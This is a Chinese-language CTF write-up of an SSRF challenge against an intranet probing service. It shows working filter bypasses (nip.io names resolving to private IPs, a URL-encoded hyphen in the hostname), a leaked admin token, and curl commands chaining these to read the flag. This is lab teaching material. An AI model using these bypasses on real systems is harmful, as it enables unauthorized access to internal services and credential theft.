## 题目原文

> 公司 IT 部门部署了一套内网资产探测服务，用于自动检测和监控内网中各业务服务的健康状态。运维人员可以通过该服务输入目标 URL 进行连通性检测，并查看目标服务的响应信息。系统部署在内网管理区，据说 Flag 就存储在某个内网服务中。在渗透过程中，攻击者发现了一个关键的内网服务接口 `http://internal-api:5000/debug/config`，该服务运行在 `internal-api:5000` 上。利用 SSRF 漏洞，攻击者可以构造特定的 URL 请求，通过内网资产探测服务访问这个内部接口，从而获取敏感配置信息或进一步利用该服务进行攻击。

## 题解

### 入口与指纹

`Werkzeug/3.1.7` + `Python/3.9`。登录页直接给 `admin/Password123`，登录后是 URL 探测表单：

```
POST /probe
  target_url=<URL>
  timeout=1|3|5|10|30
  follow_redirect=on
```

响应回显状态码、内容长度、Content-Type 和响应体预览——**预览就是 SSRF 的数据外带通道**。

### 关键观察

**1. SSRF 过滤按「字面量」判断，不做 DNS 解析。**

| 目标 | 结果 |
| --- | --- |
| `http://172.19.0.2:5000/` | `禁止访问内网地址` |
| `http://127.0.0.1:5000/` | `访问被阻止` |
| `http://internal-api:5000/` | `访问被阻止`（主机名黑名单） |
| `http://0x7f000001:5000/`、`http://2130706433:5000/`、`http://127.1:5000/` | 不解析，直接连接失败 |
| `file:///etc/passwd`、`gopher://…` | `不支持的协议` |

**两种绕过有效**：

- `http://<私网IP>.nip.io:5000/`——DNS 名字解析到私网，过滤器只看字面量；
- `http://internal%2dapi:5000/`——URL 编码的连字符绕过了主机名黑名单。

**2. `/debug/config` 泄露了内网 API 的管理 token。**

```json
{"api":{"admin_token":"internal_admin_token_2024",
        "internal_url":"http://internal-api:5000"},
 "database":{"host":"localhost","name":"internal_db","port":3306}}
```

**3. 真正的 flag 端点是 `/admin/info`，token 通过 query 传入。**

`/admin/info` 裸访问：

```json
401 {"error":"Unauthorized"}
```

试过 header（`X-Admin-Token` / `Authorization: Bearer`）、cookie、userinfo（`http://token@host/`）全部 401。**参数名是 `token`，走 query string**：

```
GET /admin/info?token=internal_admin_token_2024
→ 200 {"environment":"production",
       "flag":"flag{833f854b-e9a5-44e4-ac75-30c5a9e35799}",
       "service":"internal-api"}
```

### 利用链

**Step 1：登录探测服务。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'username=admin&password=Password123' "http://$T/login"
```

**Step 2：绕过 SSRF 过滤，读内网配置。**

```bash
curl -s -b cj -X POST   --data-urlencode 'target_url=http://172.19.0.2.nip.io:5000/debug/config'   -d 'timeout=3' "http://$T/probe"
```

预览里得到 `admin_token`。内网子网每次重建实例都会变（本例是 `172.19.0.0/16`），扫 `172.17~172.21.0.2:5000` 即可定位。

**Step 3：带 token 访问管理接口。**

```bash
curl -s -b cj -X POST   --data-urlencode 'target_url=http://172.19.0.2.nip.io:5000/admin/info?token=internal_admin_token_2024'   -d 'timeout=3' "http://$T/probe"
```

预览：

```json
{"environment":"production","flag":"flag{833f854b-…}","service":"internal-api"}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `internal-api:5000/admin/info?token=<admin_token>`，经探测服务的 SSRF 读取 |

### 复盘

- **SSRF 过滤器只看字面量。** `nip.io` 或 `internal%2dapi` 都能绕；不要因为 `127.0.0.1` 被拦就放弃。
- **泄露的 token 要枚举「消费它的端点」。** 单段路径枚举只有 `/health`、`/status`、`/debug/config`；加上**两段式**（`/admin/info`、`/api/*`、`/internal/*`）立刻出现 401 端点。
- **401 是重要信号。** 它证明端点存在且只差凭据；404 才是「没有这个端点」。
- **token 的传递位置要全试。** 本题是 query 的 `token` 参数；header、cookie、userinfo 全部无效。
- **通过 SSRF 枚举时，把「状态码」当唯一输出。** 探测服务把目标响应包成预览页，状态码是最稳定的判据。
- 内网子网会随实例重建变化，脚本里不要写死 IP。
